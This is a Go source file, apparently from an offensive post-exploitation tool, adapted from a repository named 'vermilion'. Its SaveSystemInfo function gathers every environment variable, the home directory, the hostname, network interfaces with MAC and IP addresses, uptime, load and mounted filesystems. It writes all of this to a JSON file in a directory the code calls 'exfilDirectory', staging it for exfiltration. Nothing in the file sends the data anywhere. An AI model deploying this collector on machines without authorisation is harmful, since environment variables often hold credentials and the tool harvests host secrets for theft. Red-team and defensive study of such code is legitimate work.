package internals

// Code mostly taken from https://github.com/R3DRUN3/vermilion/blob/main/internal/scan.go
// I liked most of his implementation, credit to above repo. Modifications made.

import (
	"encoding/json"
	"fmt"
	"io"
	"net"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"
)
// saveSystemInfo retrieves and saves environment variables, OS info, and IP addresses.
func SaveSystemInfo(exfilDirectory string) (string, error) {
	systemInfo, err := GetSystemInfo()
	if err != nil {
		return "", fmt.Errorf("[!] Failed to retrieve system info: %w", err)
	}

	// Convert system info to JSON
	data, err := json.MarshalIndent(systemInfo, "", "  ")
	if err != nil {
		return "", fmt.Errorf("[!] Failed to serialize system info: %w", err)
	}

	// Write system info to a file
	filePath := filepath.Join(exfilDirectory, "system_info.json")
	err = os.WriteFile(filePath, data, 0644)
	if err != nil {
		return "", fmt.Errorf("[!] Failed to write system info to file: %w", err)
	}

	return filePath, nil
}

// GetSystemInfo retrieves environment variables, OS info, and IP addresses.
func GetSystemInfo() (map[string]interface{}, error) {
	info := make(map[string]interface{})

	// Get environment variables
	info["env_vars"] = os.Environ()

	// Get OS info
	info["os"] = map[string]string{
		"os":      runtime.GOOS,
		"arch":    runtime.GOARCH,
		"num_cpu": fmt.Sprintf("%d", runtime.NumCPU()),
	}

	// Get current user and hostname
	user, err := os.UserHomeDir()
	if err == nil {
		info["current_user"] = user
	} else {
		info["current_user"] = "N/A"
	}

	hostname, err := os.Hostname()
	if err == nil {
		info["hostname"] = hostname
	} else {
		info["hostname"] = "N/A"
	}

	// Get local IP addresses + MACs
	var hostInterfaces []string
	interfaces, err := net.Interfaces()
	if err == nil {
		for _, iface := range interfaces {
			var macAddr string
			if iface.HardwareAddr.String() == "" {
				macAddr = "None"
			} else {
				macAddr = iface.HardwareAddr.String()
			}
			// get list of addrs associated to interface
			addrs, err := iface.Addrs()
			if err != nil {
				// pass over errors, we have too much else to do 
				continue
			}
			var ipAddr []string
			for _, addr := range addrs {
				ipAddr = append(ipAddr, addr.String())
			}
	
			hostInterfaces = append(hostInterfaces, fmt.Sprintf("%s %s %s", iface.Name, macAddr, ipAddr))
		}
	}
	info["local_ips"] = hostInterfaces

	// Get system uptime
	uptime, err := getSystemUptime()
	if err == nil {
		info["uptime"] = uptime
	} else {
		info["uptime"] = "N/A"
	}

	// Get load averages (Linux-specific)
	loadAvg, err := getLoadAverage()
	if err == nil {
		info["load_avg"] = loadAvg
	} else {
		info["load_avg"] = "N/A"
	}

	// Get mounted file systems
	mountedFS, err := getMountedFileSystems()
	if err == nil {
		info["mounted_filesystems"] = mountedFS
	} else {
		info["mounted_filesystems"] = "N/A"
	}

	return info, nil
}

func getSystemUptime() (string, error) {
	if runtime.GOOS == "linux" {
		data, err := os.ReadFile("/proc/uptime")
		if err != nil {
			return "", err
		}
		fields := strings.Fields(string(data))
		uptimeSeconds, err := strconv.ParseFloat(fields[0], 64)
		if err != nil {
			return "", err
		}
		uptime := time.Duration(uptimeSeconds) * time.Second
		return uptime.String(), nil
	}
	return "Unsupported OS for uptime", nil
}

func getLoadAverage() (string, error) {
	if runtime.GOOS == "linux" {
		data, err := os.ReadFile("/proc/loadavg")
		if err != nil {
			return "", err
		}
		return string(data), nil
	}
	return "Unsupported OS for load average", nil
}

func getMountedFileSystems() ([]string, error) {
	var result []string
	file, err := os.Open("/proc/mounts")
	if err != nil {
		return nil, err
	}
	defer file.Close()

	data, err := io.ReadAll(file)
	if err != nil {
		return nil, err
	}

	lines := strings.Split(string(data), "\n")
	result = append(result, lines...)

	return result, nil
}
